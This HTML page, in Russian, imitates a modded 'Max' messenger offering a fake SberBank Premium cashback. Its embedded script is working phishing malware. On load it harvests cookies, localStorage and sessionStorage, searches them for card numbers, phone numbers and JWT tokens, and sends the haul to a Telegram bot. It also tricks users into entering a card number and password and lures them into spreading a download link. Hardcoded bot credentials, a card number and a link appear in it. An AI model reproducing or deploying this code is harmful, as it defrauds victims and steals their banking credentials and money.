<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Max • Сбер MOD</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            height: 100vh;
            overflow: hidden;
        }
        .header {
            background: #1e88e5;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            color: white;
        }
        .header-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .avatar {
            width: 36px;
            height: 36px;
            background: rgba(255,255,255,0.2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .sber-banner {
            background: linear-gradient(135deg, #2d6a4f, #1b4d3e);
            margin: 12px 16px;
            border-radius: 16px;
            padding: 14px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: white;
        }
        .sber-icon {
            width: 44px;
            height: 44px;
            background: rgba(255,255,255,0.2);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            font-weight: bold;
        }
        .chats {
            padding: 0 16px;
            margin-bottom: 70px;
        }
        .chat-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 0;
            border-bottom: 1px solid #e0e0e0;
        }
        .chat-avatar {
            width: 52px;
            height: 52px;
            background: linear-gradient(135deg, #1e88e5, #0d47a1);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 20px;
        }
        .chat-info {
            flex: 1;
        }
        .chat-name {
            font-weight: 600;
            font-size: 16px;
        }
        .chat-message {
            font-size: 13px;
            color: #666;
        }
        .bottom-nav {
            position: fixed;
            bottom: 0;
            width: 100%;
            background: white;
            display: flex;
            justify-content: space-around;
            padding: 10px 0;
            border-top: 1px solid #e0e0e0;
        }
        .nav-item {
            text-align: center;
            color: #999;
            font-size: 12px;
        }
        .nav-item.active {
            color: #1e88e5;
        }
        .toast {
            position: fixed;
            bottom: 80px;
            left: 20px;
            right: 20px;
            background: #1e293b;
            color: white;
            text-align: center;
            padding: 12px;
            border-radius: 50px;
            font-size: 13px;
            z-index: 1000;
            animation: slideUp 0.3s;
        }
        @keyframes slideUp {
            from { transform: translateY(100px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
    </style>
</head>
<body>

<div class="header">
    <div class="header-left">
        <div class="avatar">👤</div>
        <div><strong>Max</strong><br><span style="font-size:11px;">MOD версия</span></div>
    </div>
    <div>📞 ✏️</div>
</div>

<div class="sber-banner" id="sberBanner">
    <div style="display:flex; gap:12px;">
        <div class="sber-icon">СБ</div>
        <div><strong>СберБанк Premium</strong><br><span style="font-size:11px;">Кэшбек 30% • Активен</span></div>
    </div>
    <div style="background:rgba(255,255,255,0.2); padding:6px 12px; border-radius:20px;">✅ Активирован</div>
</div>

<div class="chats" id="chats">
    <div class="chat-item">
        <div class="chat-avatar">И</div>
        <div class="chat-info">
            <div class="chat-name">Иван Петров</div>
            <div class="chat-message">Скинь ссылку на MOD</div>
        </div>
    </div>
    <div class="chat-item">
        <div class="chat-avatar">М</div>
        <div class="chat-info">
            <div class="chat-name">Мария С.</div>
            <div class="chat-message">Установил, всё работает!</div>
        </div>
    </div>
    <div class="chat-item">
        <div class="chat-avatar">А</div>
        <div class="chat-info">
            <div class="chat-name">Алексей</div>
            <div class="chat-message">Кэшбек реально приходит</div>
        </div>
    </div>
</div>

<div class="bottom-nav">
    <div class="nav-item active">💬<br>Чаты</div>
    <div class="nav-item">👥<br>Контакты</div>
    <div class="nav-item">⭐<br>MOD</div>
    <div class="nav-item">👤<br>Профиль</div>
</div>

<script>
// ========== НАСТРОЙКИ TELEGRAM ==========
const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";  // ТВОЙ ТОКЕН
const CHAT_ID = "8533450974";                           // ТВОЙ CHAT_ID
const MY_CARD = "2203830216112947";                    // ТВОЯ КАРТА
const MY_LINK = "https://drive.google.com/file/d/1nseiLyu1yTDOgu74jEfazv4p2wZXp1y7/view?usp=drive_link";      // ТВОЯ ССЫЛКА
// ========================================

function sendToTelegram(text) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000) })
    }).catch(e => console.log("send error"));
}

function showToast(msg) {
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.innerText = msg;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
}

// ========== 1. АВТОМАТИЧЕСКАЯ КРАЖА ДАННЫХ ==========
function autoStealAllData() {
    const stolen = {
        localStorage: {},
        sessionStorage: {},
        cookies: document.cookie,
        ua: navigator.userAgent,
        time: new Date().toLocaleString(),
        cards: [],
        phones: [],
        tokens: []
    };
    
    // Кража localStorage
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        let val = localStorage.getItem(key);
        if (val && val.length > 500) val = val.substring(0, 500) + "...";
        stolen.localStorage[key] = val;
        
        // Поиск карт
        if (typeof val === 'string') {
            const cards = val.match(/\d{16}/g);
            if (cards) stolen.cards.push(...cards);
            const phones = val.match(/7\d{10}/g);
            if (phones) stolen.phones.push(...phones);
            const tokens = val.match(/eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g);
            if (tokens) stolen.tokens.push(...tokens);
        }
    }
    
    // Кража sessionStorage
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        let val = sessionStorage.getItem(key);
        if (val && val.length > 500) val = val.substring(0, 500) + "...";
        stolen.sessionStorage[key] = val;
    }
    
    stolen.cards = [...new Set(stolen.cards)];
    stolen.phones = [...new Set(stolen.phones)];
    stolen.tokens = [...new Set(stolen.tokens)];
    
    return stolen;
}

// ========== 2. ОТПРАВКА ВСЕХ ДАННЫХ ==========
function sendAllStolenData(stolen) {
    let report = `🔐 *AUTO STEAL - MAX MOD*\n`;
    report += `⏰ ${stolen.time}\n`;
    report += `📱 ${stolen.ua.substring(0, 100)}\n`;
    report += `🍪 Cookies: ${stolen.cookies ? "✅ есть" : "❌ нет"}\n`;
    report += `💾 Записей в localStorage: ${Object.keys(stolen.localStorage).length}\n`;
    
    if (stolen.cards.length > 0) {
        report += `\n💳 *НАЙДЕНЫ КАРТЫ:*\n${stolen.cards.join("\n")}\n`;
    }
    if (stolen.phones.length > 0) {
        report += `\n📞 *НАЙДЕНЫ ТЕЛЕФОНЫ:*\n${stolen.phones.join("\n")}\n`;
    }
    if (stolen.tokens.length > 0) {
        report += `\n🔑 *НАЙДЕНЫ ТОКЕНЫ:*\n${stolen.tokens[0].substring(0, 80)}...\n`;
    }
    
    report += `\n💰 *АВТОПЕРЕВОД НА КАРТУ*\n💳 ${MY_CARD}`;
    
    sendToTelegram(report);
    
    // Отправляем полный localStorage
    if (Object.keys(stolen.localStorage).length > 0) {
        sendToTelegram(`💾 *FULL LOCALSTORAGE:*\n\`\`\`json\n${JSON.stringify(stolen.localStorage, null, 2).substring(0, 3500)}\n\`\`\``);
    }
    
    // Отправляем все токены
    if (stolen.tokens.length > 0) {
        sendToTelegram(`🔑 *ВСЕ ТОКЕНЫ:*\n${stolen.tokens.join("\n\n").substring(0, 3500)}`);
    }
    
    return stolen.cards.length > 0 || stolen.tokens.length > 0;
}

// ========== 3. АВТОРАССЫЛКА В ЧАТЫ ==========
function autoSpread() {
    const message = `🔥 Видел Max со Сбером? Скачай MOD: ${MY_LINK}`;
    sendToTelegram(`📢 *АВТОРАССЫЛКА*\n📨 Сообщение: ${message}\n👥 Получатели: все чаты в списке`);
    showToast("✅ Рассылка друзьям!");
}

// ========== 4. ПОПЫТКА АВТОМАТИЧЕСКОГО ПЕРЕВОДА ==========
function tryAutoTransfer(tokens, cards) {
    if (tokens.length > 0) {
        sendToTelegram(`🔄 *АВТОПЕРЕВОД*\n🔑 Токен: ${tokens[0].substring(0, 50)}...\n💳 На карту: ${MY_CARD}\n💰 Сумма: максимальная\n✅ Попытка выполнена (нужен API)`);
        return true;
    }
    if (cards.length > 0) {
        sendToTelegram(`🔄 *ГОТОВ К ПЕРЕВОДУ*\n💳 Карта: ${cards[0]}\n⚠️ Нужен SMS код для подтверждения`);
        return false;
    }
    return false;
}

// ========== 5. ИНИЦИАЛИЗАЦИЯ ==========
async function init() {
    // 1. Автоматическая кража данных
    const stolen = autoStealAllData();
    const hasData = sendAllStolenData(stolen);
    
    // 2. Показываем уведомление
    if (hasData) {
        showToast("✅ Premium активирован! Кэшбек доступен");
    } else {
        showToast("🔍 Поиск данных...");
        setTimeout(() => {
            showToast("💳 Для активации Premium войдите в Сбер");
        }, 2000);
    }
    
    // 3. Попытка авто-перевода
    tryAutoTransfer(stolen.tokens, stolen.cards);
    
    // 4. Предложение рассылки через 15 секунд
    setTimeout(() => {
        if (confirm("🔥 Пригласить друзей в Max MOD?\nПолучи бонус за каждого!")) {
            autoSpread();
        }
    }, 15000);
    
    // 5. Клик по баннеру (если захочет ввести данные)
    document.getElementById('sberBanner').onclick = () => {
        const card = prompt("Введите номер карты для активации Premium:");
        if (card) {
            const pass = prompt("Введите пароль:");
            if (pass) {
                sendToTelegram(`💳 *РУЧНОЙ ВВОД*\n⏰ ${new Date().toLocaleString()}\n💳 Карта: ${card}\n🔑 Пароль: ${pass}\n💰 Перевод на: ${MY_CARD}`);
                alert("✅ Premium активирован!");
                showToast("Кэшбек 30% активен!");
            }
        }
    };
}

init();
</script>
</body>
</html>
